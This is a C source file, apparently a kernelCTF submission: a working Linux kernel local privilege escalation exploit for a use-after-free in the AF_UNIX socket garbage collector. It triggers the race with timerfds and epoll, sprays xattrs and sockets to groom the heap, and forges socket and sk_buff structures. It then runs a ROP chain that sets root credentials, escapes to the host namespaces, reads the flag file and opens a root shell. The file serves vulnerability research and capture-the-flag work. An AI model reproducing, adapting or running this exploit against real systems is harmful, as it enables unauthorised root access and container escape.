#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/xfrm.h>
#include <linux/pfkeyv2.h>

#include <linux/pkt_cls.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_packet.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <math.h>

#include <linux/tc_act/tc_gact.h>
#include <linux/tc_act/tc_mirred.h>
#include <linux/filter.h>
#include <linux/ip.h>
#include <linux/udp.h>


#include "kernelver_17800.147.54.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;
char *g_stack1;
#define STACK_SIZE (1024 * 1024)    /* Stack size for cloned child */
uint64_t leak_kernel_text();

static int g_event1;

#define XATTR_HEAD_SIZE 0x20
#define SLAB_CNT 15
enum UNIX_IDX_RANGE {
        AFTER,
        PARTIAL,
        PARTIAL2,
        FRESH,
        FRESH2,
        IDX_MAX
};

#define PARTIAL_CNT SLAB_CNT*20
#define PARTIAL2_CNT SLAB_CNT*15
#define AFTER_CNT SLAB_CNT-1
#define UNIX_MAX_CHUNK 1000
#define UNIX_IDX(base, offset) (base*UNIX_MAX_CHUNK + offset)

static int g_socks[UNIX_MAX_CHUNK*IDX_MAX];


#ifdef DEBUG
#define err(errcode, msg, ...) \
        do { \
                perror(msg); \
                sleep(1000); \
        } while (0)
#define errx(errcode, msg, ...) \
        do { \
                puts(msg); \
                sleep(1000); \
        } while (0)
#endif



void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x10000
#define XATTR_CHUNK 1000
#define XATTR_CNT 6000

static uint64_t g_payload_location;
static uint64_t g_page_offset_base;

static int g_pwned;
static char *g_rop2;
static size_t g_rop2_len;

#define ROP2_CONST_AREA 0x10
#define ROP2_CONST_OFFSET 0x200

#define KOFFSET(x) (x-0xffffffff81000000uL)

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}

void __attribute__((naked)) get_root()
{
        asm volatile(
                "push %r15\n"
                "push %r14\n"
                "push %r13\n"
                "push %r12\n"
                "push %rbx\n"
                "push %rbp\n"
                "lea -0x2957a1(%rip), %r15\n"
        );
        asm volatile(
                "lea (%%r15,%0), %%rdi\n"
                "lea (%%r15,%1), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(INIT_CRED)),
                "r" (KOFFSET(COMMIT_CREDS))
        );
        asm volatile(
                "lea (%%r15,%0), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(AUDIT_SYSCALL_EXIT))
        );

        asm volatile(
                "lea (%%r15,%0), %%r12\n"
                "mov $1, %%rdi\n"
                "call *%%r12\n"
                "mov %%rax, %%r13\n"
                :: 
                "r" (KOFFSET(FIND_TASK_BY_VPID))
        );

        asm volatile(
                "movq 0x820(%%r13), %%r14\n"
                "movq $0x10, (%%r14)\n"
                "lea (%%r15,%0), %%rsi\n"
                "mov %%r13, %%rdi\n"
                "lea (%%r15,%1), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(INIT_NSPROXY)),
                "r" (KOFFSET(SWITCH_TASK_NAMESPACES))
        );

        asm volatile(
                "lea (%%r15,%0), %%rcx\n"
                "mov $0x1337, %%rax\n"
                "pop %%rbp\n"
                "pop %%rbx\n"
                "pop %%r12\n"
                "pop %%r13\n"
                "pop %%r14\n"
                "pop %%r15\n"
                "jmp *%%rcx\n"
                :: 
                "r" (KOFFSET(RETURN_THUNK))
        );

}

void __attribute__((naked)) after_pwn()
{
// Fix user stack and recover eflags since we didn't do when returning from kernel mode
        asm volatile(
                "mov %0, %%rsp\n"
                :: "r" (g_mmapped_buf + MMAP_SIZE - 0x100)
        );
       
        g_pwned = 1;


        set_cpu(1);

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        if (access("/proc/vmallocinfo", R_OK)) {
                printf("Exploit failed!\n");
                exit(1);
        }
        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}


size_t prepare_rop2(uint64_t *rop2, uint64_t *const_area, uint64_t const_area_kernel)

{
        uint64_t *rop2_start = rop2;

        *rop2++ = kaddr(POP_RDI);
        *rop2++ = kaddr(INIT_CRED);
        *rop2++ = kaddr(COMMIT_CREDS);

        // Namespace escape based on code by Crusaders of Rust
        *rop2++ = kaddr(POP_RDI);
        *rop2++ = 1;
        *rop2++ = kaddr(FIND_TASK_BY_VPID);
        *rop2++ = kaddr(MOV_RDI_RAX);

        *rop2++ = kaddr(POP_RSI);
        *rop2++ = kaddr(INIT_NSPROXY);

        *rop2++ = kaddr(SWITCH_TASK_NAMESPACES);


        *rop2++ = kaddr(POP_R11_R10_R9_R8_RDI_RSI_RDX_RCX);
// eflags
        *rop2++ = 0;
        rop2 += 6;

// Userspace RIP
        *rop2++ = (uint64_t) after_pwn;

        *rop2++ = kaddr(RETURN_VIA_SYSRET);

        return (char *) rop2 - (char *) rop2_start;
}



int alloc_xattr_fd_attr(int fd, char *attr, size_t size, void *buf)
{
        int res = fsetxattr(fd, attr, buf, size - XATTR_HEAD_SIZE, XATTR_CREATE);
        if (res < 0) {
                err(1, "fsetxattr");
        }

        return fd;
}

int alloc_xattr_fd(int fd, unsigned int id, size_t size, void *buf)
{
        char *attr;

        asprintf(&attr, "security.%d", id);
        alloc_xattr_fd_attr(fd, attr, size, buf);

        return fd;
}


void free_xattr_fd(int fd, int id)
{
        char *attr;

        asprintf(&attr, "security.%d", id);

        fremovexattr(fd, attr);
}


int alloc_xattr(unsigned int id, size_t size, void *buf)
{
        int fd;
        char *fname;

        asprintf(&fname, "/tmp/xattr%d", id);
        fd = open(fname, O_RDWR|O_CREAT);
        if (fd < 0)
                err(1, "open xattr");
        
        alloc_xattr_fd_attr(fd, "security.attr", size, buf);

        return fd;
}



int recv_fds(int sock, int *fds, unsigned cnt)
{
        struct cmsghdr *cmsg;
        int ret = -1;
        char buf[256];
        char cbuf[CMSG_SPACE(sizeof(int)*cnt)];
        int fd = -1; 

        struct iovec iov = {
                .iov_base = buf,
                .iov_len = 1
        };

        struct msghdr msg = {
        	.msg_iov = &iov,
        	.msg_iovlen = 1,
        	.msg_control = cbuf,
        	.msg_controllen = sizeof(cbuf)*cnt
        };

        ret = recvmsg(sock, &msg, MSG_DONTWAIT);

        if (ret < 0) {
//                perror("recvmsg unix");
                return ret;
        }

        if (ret >= 0) {
                if (msg.msg_controllen < 24)
                        return -1;
        	cmsg = CMSG_FIRSTHDR(&msg);
        	memcpy(fds, CMSG_DATA(cmsg), sizeof(fd)*cnt);

        }
        return 0;
}

int recv_fd(int sock)
{
        int fd;
        return recv_fds(sock, &fd, 1) ? -1 : fd;
}

int send_fds(int sock, int *fds, unsigned int cnt)
{
        struct cmsghdr *cmsg;
        int ret;
        char buf[128];
        char cbuf[CMSG_SPACE(sizeof(int)*cnt)];

        struct iovec iov = {
                .iov_base = buf,
                .iov_len = 1
        };

        struct msghdr msg = {
        	.msg_iov = &iov,
        	.msg_iovlen = 1,
        	.msg_control = cbuf,
        	.msg_controllen = sizeof(cbuf)
        };
        

        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int)*cnt);

        memcpy(CMSG_DATA(cmsg), fds, sizeof(*fds)*cnt);
        ret = sendmsg(sock, &msg, 0);

//        if (ret < 0)
//                perror("sendmsg fd\n");

        return ret;
        
}

int send_fd(int sock, int fd)
{
        return send_fds(sock, &fd, 1);
}

#define DUP_CNT 1300
#define EPOLL_CNT 550



void create_watches(int fd, int dup_cnt)
{
        int epoll_fds[EPOLL_CNT];
        int tfd_dups[DUP_CNT];

        for (int i=0; i<dup_cnt; i++)
        {
                tfd_dups[i] = dup(fd);

                if (tfd_dups[i] < 0)
                        err(1, "dup() failed, open files limit probably too low");
        }

        for (int i=0; i<EPOLL_CNT; i++)
        {
                epoll_fds[i] = epoll_create1(0);

                if (epoll_fds[i] < 0)
                        err(1, "epoll_create() failed, open files limit probably too low");
        }

        for (int i=0; i<EPOLL_CNT; i++)
        {
                for (int j=0; j<dup_cnt; j++)
                {
                        struct epoll_event ev = { .events = EPOLLIN };

                        if (epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, tfd_dups[j], &ev) < 0)
                                err(1, "epoll_ctl");
                }
        }
}


#define NSEC_PER_SEC 1000000000UL

void ts_add(struct timespec *ts, unsigned long usecs)
{
        ts->tv_nsec += usecs * 1000;

        if (ts->tv_nsec >= NSEC_PER_SEC) {
                ts->tv_sec++;
                ts->tv_nsec -= NSEC_PER_SEC;
        }
}


struct child_arg {
        int tfd;
        int sock;
        int try;
        int delay1;
        int delay2;
        int victim;
        int slowdown;
        int gc;
        int event;
};

int child_send(void *arg)
{
        struct itimerspec its = { 0 };
        struct child_arg *carg = (struct child_arg *) arg;
        set_cpu(1);


        ts_add(&its.it_value, carg->delay2);

        eventfd_t event_value;
        eventfd_read(carg->event, &event_value);

        send_fd(carg->sock, carg->victim);
        close(carg->victim);

        timerfd_settime(carg->tfd, 0, &its, NULL);
        close(carg->gc);

        volatile uint64_t v;
        while(1)
        {
                v++;
        }

        sleep(1000);
        return v;

}

void prepare_sock(char *buf)
{
// sk_receive_queue.next
        *(uint64_t *) (buf + 0xd8) = 0xcafebabe;
// sk_receive_queue.prev
        *(uint64_t *) (buf + 0xd8 + 8) = 0xdeadbeef;;

// entry 1
// sk_socket
        *(uint64_t *) (buf + 0x270) = g_payload_location + 0x1000 - 0x10;
// link.next
        *(uint64_t *) (buf + 0x378) = g_payload_location + 0x1000 + 0x378;
// link.prev
        *(uint64_t *) (buf + 0x378 + 8) = 0;
// inflight
        *(uint64_t *) (buf + 0x388) = 1;
}

void prepare_more_socks(char *buf)
{
// sk_receive_queue.next
        *(uint64_t *) (buf + 0xd8) = g_payload_location + 0x3000;
// sk_receive_queue.prev
        *(uint64_t *) (buf + 0xd8 + 8) = 0xdeadbeef;;

// entry 3
// sk_socket->file
        *(uint64_t *) (buf + 0x270) = g_payload_location + 0x2000 - 0x10;
// link.next
        *(uint64_t *) (buf + 0x378) = g_payload_location + 0x1600 + 0x378;
// link.prev
        *(uint64_t *) (buf + 0x378 + 8) = g_payload_location + 0x1000 + 0x378;
// inflight
        *(uint64_t *) (buf + 0x388) = 1;

// entry 4
// sk_socket->file
        *(uint64_t *) (buf + 0x1600 + 0x270) = g_payload_location + 0x1000 - 0x10;
// link.next
        *(uint64_t *) (buf + 0x1600 + 0x378) = kaddr(GC_INFLIGHT_LIST);
// link.prev
        *(uint64_t *) (buf + 0x1600 + 0x378 + 8) = g_payload_location + 0x378;
// inflight
        *(uint64_t *) (buf + 0x1600 + 0x388) = 1;

// entry 2
// sk_socket->file
        *(uint64_t *) (buf + 0x1000 + 0x270) = g_payload_location + 0x1000 - 0x10;
// link.next
        *(uint64_t *) (buf + 0x1000 + 0x378) = g_payload_location + 0x378;
// link.prev
        *(uint64_t *) (buf + 0x1000 + 0x378 + 8) = 0;
// inflight
        *(uint64_t *) (buf + 0x1000 + 0x388) = 1;

// ->file.fcount
        *(uint64_t *) (buf + 0x1000) = g_payload_location + 0x1000 + 8 - 0x38;
        *(uint64_t *) (buf + 0x1000 + 8) = 2;

// ->file.fcount for 2nd sock
        *(uint64_t *) (buf + 0x2000) = g_payload_location + 0x2000 + 8 - 0x38;
        *(uint64_t *) (buf + 0x2000 + 8) = 1;

// sk_buff
// next
        *(uint64_t *) (buf + 0x3000) = g_payload_location + 0xd8;
// prev
        *(uint64_t *) (buf + 0x3000 + 8) = kaddr(GC_INFLIGHT_LIST);

        uint64_t *rop = (uint64_t *) (buf + 0x3000 + 0x10);

        uint64_t *rop2 = (uint64_t *) (buf + 0x5100);
        prepare_rop2(rop2, (uint64_t *) (buf + 0x6100), g_payload_location + 0x6100);

        *rop++ = kaddr(POP_RSP);
        *rop++ = g_payload_location + 0x5100;

// cb.fp
        *(uint64_t *) (buf + 0x3000 + 0x28 + 0x10) = g_payload_location + 0x4000;

        *(uint64_t *) (buf + 0x3000 - 0x70) = kaddr(POP_RSP_RBP_RBX);
// destructor
        *(uint64_t *) (buf + 0x3000 + 0x60) = kaddr(G1);
        *(uint64_t *) (buf + 0x3000 + 0xc8) = kaddr(PUSH_RSI_JMP_QWORD_RSI_MINUS70);
// users
        *(uint32_t *) (buf + 0x3000 + 0xdc) = 1;


// fpl.count
        *(uint16_t *) (buf + 0x4000) = 1;

// fpl.fp
        *(uint64_t *) (buf + 0x4000 + 0x10) = g_payload_location + 0x4100;

// struct file->f_inode
        *(uint64_t *) (buf + 0x4100 + 0x20) = g_payload_location + 0x5000;

// struct socket
// sk
        *(uint64_t *) (buf + 0x4f80 + 0x18) = g_payload_location;
// ops
        *(uint64_t *) (buf + 0x4f80 + 0x20) = kaddr(UNIX_FAMILY_OPS);
// struct inode
// i_mode
        *(uint64_t *) (buf + 0x5000) = 0140000;

}


unsigned int parse_zoneinfo(char *buf, char *zone, unsigned int cpu, unsigned int *high, unsigned int *batch)
{
        char *t;

        t = strstr(buf, zone);

        char cpustr[10];
        snprintf(cpustr, sizeof(cpu), "cpu: %d", cpu);

        t = strstr(t, cpustr);
        t = strstr(t, "count: ");

        unsigned int cnt = atoi(t+7);

        if (high) {
                t = strstr(t, "high: ");
                *high = atoi(t+6);
        }

        if (batch) {
                t = strstr(t, "batch: ");
                *batch = atoi(t+7);
        }

        return cnt;
        
}

unsigned int get_pagecount(unsigned int cpu, unsigned int *high, unsigned int *batch)
{
        static char zibuf[10000];
        static int fdzi = -1;

        if (fdzi < 0) {
                fdzi = open("/proc/zoneinfo", 0, O_DIRECT);
                if (fdzi < 0)
                        err(1, "open zoneinfo");
        }

        lseek(fdzi, SEEK_SET, 0);
        read(fdzi, zibuf, sizeof(zibuf));               

        return parse_zoneinfo(zibuf, "zone    DMA32", cpu, high, batch);
}

int get_fresh_unix(unsigned int cpu, int xattr_fd)
{
        unsigned int pcp1, pcp2;


// Prefill PCP order 2
        for (int i = 0; i < 10; i++)
        {
                alloc_xattr_fd(xattr_fd, 1000+i, 0x4000, g_mmapped_buf);
        }

        for (int i = 0; i < 10; i++)
        {
                free_xattr_fd(xattr_fd, 1000+i);
        }
        
        unsigned int detected = 0;

        pcp1 = get_pagecount(cpu, NULL, NULL);

// Get fresh sock_inode_cache slab
        for (unsigned int i = 0; i < SLAB_CNT*10; i++)
        {
                g_socks[UNIX_IDX(FRESH, i)] = socket(AF_NETLINK, SOCK_STREAM, 0);
                pcp2 = get_pagecount(cpu, NULL, NULL);
                int delta = pcp2 - pcp1;
                pcp1 = pcp2;

                if (i > 1 && (delta <= -4 && delta > -8)) {
                        detected = 1;
                        break;
                }

        }

        if (!detected)
                errx(1, "Unable to detect fresh sock_inode slab");


        detected = 0;

        int first_unix;
        for (unsigned int i = 0; i < SLAB_CNT*10; i++)
        {
                g_socks[UNIX_IDX(FRESH2, i)] = socket(AF_UNIX, SOCK_STREAM, 0);
                pcp2 = get_pagecount(cpu, NULL, NULL);
                int delta = pcp2 - pcp1;
                        
                if (delta <= -4 && delta > -8) {
                        detected = 1;
                        first_unix = g_socks[UNIX_IDX(FRESH2, i)];
                        break;
                }

                pcp1 = pcp2;
        }

        if (!detected)
                errx(1, "Unable to detect fresh UNIX slab");


        return first_unix;
}

#define FD_PER_SOCKET 250
void one_attempt(int tfd, int tfd2, int xattr_fd, int *fds)
{
        int pair[2];
        static unsigned int try = 0;
        int c2;

        int oldgc = socket(AF_UNIX, SOCK_STREAM, 0);


        for (int i = 0; i < PARTIAL_CNT; i++)
        {
                g_socks[UNIX_IDX(PARTIAL, i)] = socket(AF_UNIX, SOCK_STREAM, 0);
        }

        for (int i = 0; i < PARTIAL2_CNT; i++)
        {
                g_socks[UNIX_IDX(PARTIAL2, i)] = socket(AF_UNIX, SOCK_STREAM, 0);
        }

        int victim = get_fresh_unix(0, xattr_fd);


        int gc = dup(oldgc);
        close(oldgc);
        for (int i = 0; i < AFTER_CNT; i++)
        {
                g_socks[UNIX_IDX(AFTER, i)] = socket(AF_UNIX, SOCK_STREAM, 0);
        }


        if (socketpair(AF_UNIX, SOCK_STREAM, 0, pair) < 0)
                err(1, "unix pari");

        int server = socket(AF_UNIX, SOCK_STREAM, 0);
        if (server < 0)
                err(1, "socket unix");

// Increase node->nr_partial
        for (int i = 0; i < PARTIAL2_CNT; i++)
        {
                if ((i % 4) == 0)
                        close(g_socks[UNIX_IDX(PARTIAL2, i)]);
        }

        struct sockaddr_un saddr;
        saddr.sun_family = AF_UNIX;
        int salen = sizeof(saddr.sun_family) + sprintf(saddr.sun_path, "%c/unix-gc-%d", '\0', getpid());

        if (bind(server, (struct sockaddr *)&saddr, salen) < 0)
                err(1, "unix bind");

        if (listen(server, -1) < 0)
                err(1, "listen");

        send_fd(pair[0], server);
        close(server);

        
        int client = socket(AF_UNIX, SOCK_STREAM, 0);
        if (client < 0)
                err(1, "socket unix");
        int trigger_sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (trigger_sock < 0)
                err(1, "socket unix");

        struct child_arg carg = {
                .tfd = tfd,
                .try = try++,
                .sock = client,
                .victim = victim,
                .gc = gc,
                .event = g_event1
        };

        carg.delay1 = 20;
        carg.delay2 = 22;
        printf("delays: %d %d try: %d\n", carg.delay1,  carg.delay2, carg.try);
        usleep(50000);

        pid_t pid = clone(child_send, g_stack1 + STACK_SIZE, CLONE_FS | CLONE_FILES | SIGCHLD, (void *) &carg);

        sleep(0.1);
        eventfd_write(g_event1, 1);

        struct itimerspec its = { 0 };
        ts_add(&its.it_value, carg.delay1);
        timerfd_settime(tfd2, 0, &its, NULL);

        if (connect(client, (struct sockaddr *) &saddr, salen) < 0)
                err(1, "connect unix");

// Race condition part ends here, but we don't know if it succeeded or not

// server sock closed above
        server = recv_fd(pair[1]);

        if (server < 0) {
                printf("Did not recv resurrected server sock\n");
                goto FAIL;
        }

        c2 = accept(server, (struct sockaddr *) &saddr, &salen);

// victim sock closed in child_send()
        int victims[2];
        if (recv_fds(c2, victims, 1) < 0) {
                printf("Did not recv victims\n");
                goto FAIL;
        }

        for (int i = 0; i < 15; i++)
        {
                prepare_sock(g_mmapped_buf + 1088*i);
        }

        close(victims[0]);

// Victim is now freed, but still on gc_inflight_list

        for (int i = 0; i < AFTER_CNT; i++)
        {
                close(g_socks[UNIX_IDX(AFTER, i)]);
        }


        for (int i = 0; i < PARTIAL_CNT; i++)
        {
                if ((i % 2) == 0)
                        close(g_socks[UNIX_IDX(PARTIAL, i)]);
        }

// Increase unix_tot_inflight, otherwise gc won't be triggered
        send_fd(pair[0], trigger_sock);

        for (int i = 0; i < 10; i++)
        {
                alloc_xattr_fd(xattr_fd, i, 0x4000, g_mmapped_buf);
        }


// trigger gc
        close(pair[0]);

// cleanup
FAIL: 
        for (int i = 0; i < UNIX_MAX_CHUNK*IDX_MAX; i++)
        {
                if (g_socks[i])
                        close(g_socks[i]);
        }
        memset(g_socks, 0, sizeof(g_socks));

        if (client > 0)
                close(client);
        if (server > 0)
                close(server);
        close(pair[0]);
        close(pair[1]);
        close(trigger_sock);
        close(c2);
        close(gc);

        kill(pid, 9);
        int status;
        if (waitpid(pid, &status, 0) < 0)
                err(1, "waitpid");
        for (int i = 0; i < 10; i++)
        {
                free_xattr_fd(xattr_fd, i);
        }
        usleep(80000);
}

int main(int argc, char **argv)
{
        int ret;
        struct rlimit rlim;

        system("cat /proc/cpuinfo");

        rlim.rlim_cur = rlim.rlim_max = 4096;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
                err(1, "setrlimit()");

        if (0 && argc > 1 && (argv[1][0] == 'f' || argv[1][0] == '0')) {
                g_kernel_text = strtoull(argv[1], NULL, 16);
                printf("Using kernel base: 0x%lx\n", g_kernel_text);
        } else {
                printf("Using default kernel base, your chance is 1/512, good luck!\nTry providing leaked kernel base as argv[1]\n");

                g_kernel_text = 0xffffffff81000000uL;
        }

        if (argc > 2 && (argv[2][0] == 'f' || argv[2][0] == '0')) {
                g_page_offset_base = strtoull(argv[2], NULL, 16);
        } else {
                g_page_offset_base = 0xffff888000000000L;
        }

        printf("Using page_offset_base 0x%lx\n", g_page_offset_base);

        setbuf(stdout, NULL);

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);



#define ROP2_MMAP_SIZE 0x4000
        g_rop2 = mmap(NULL, ROP2_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_rop2 == MAP_FAILED)
                err(1, "mmap");

        struct timeval time;
        gettimeofday(&time,NULL);

        srand((time.tv_sec * 1000) + (time.tv_usec / 1000));


        set_cpu(0);


        int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
        int tfd2 = timerfd_create(CLOCK_MONOTONIC, 0);

        g_stack1 = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (g_stack1 == MAP_FAILED) {
                perror("mmap");
                exit(1);
        }

        g_event1 = eventfd(0, 0);
        create_watches(tfd2, 700);
        create_watches(tfd, 700);

        int xattr_fd = open("/tmp/x", O_RDWR|O_CREAT);
        if (xattr_fd < 0)
                err(1, "xattr open\n");


        int xfd = -1;
        unsigned int xattr_fd_idx = 0;
        char fname[512];
        g_payload_location = g_page_offset_base + 0x06000020;

        printf("Payload location: 0x%lx\n", g_payload_location);
        prepare_more_socks(g_mmapped_buf);

        for (int i = 0; i < XATTR_CNT; i++)
        {
                if (i == 0 || (i / XATTR_CHUNK) > xattr_fd_idx) {
                        xattr_fd_idx = i / XATTR_CHUNK;
                        if ((i % 1000) == 0)
                                printf("xattrs %d/%d\n", i, XATTR_CNT);

                        snprintf(fname, sizeof(fname), "/tmp/x_%d", xattr_fd_idx);

                        xfd = open(fname, O_RDWR|O_CREAT, 0600);
                        if (xfd < 0)
                                err(1, "xattr open\n");

                }

                alloc_xattr_fd(xfd, i, 65535, g_mmapped_buf);
        }

        int fds[FD_PER_SOCKET];
        for (int i = 0; i < FD_PER_SOCKET; i++)
        {
                fds[i] = socket(AF_NETLINK, SOCK_DGRAM, 0);
                if (fds[i] < 0)
                        err(1, "socket netlink slow");
        }

        printf("parent pid: %d xattr fd: %d %d\n", getpid(), xfd, xattr_fd);
        for (int i = 0; i < 10000; i++)
        {
                one_attempt(tfd, tfd2, xattr_fd, fds);
        }

        
        if (!g_pwned) {
                printf("Failed to trigger vuln, try again!\n");
                _exit(0);
        }


// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
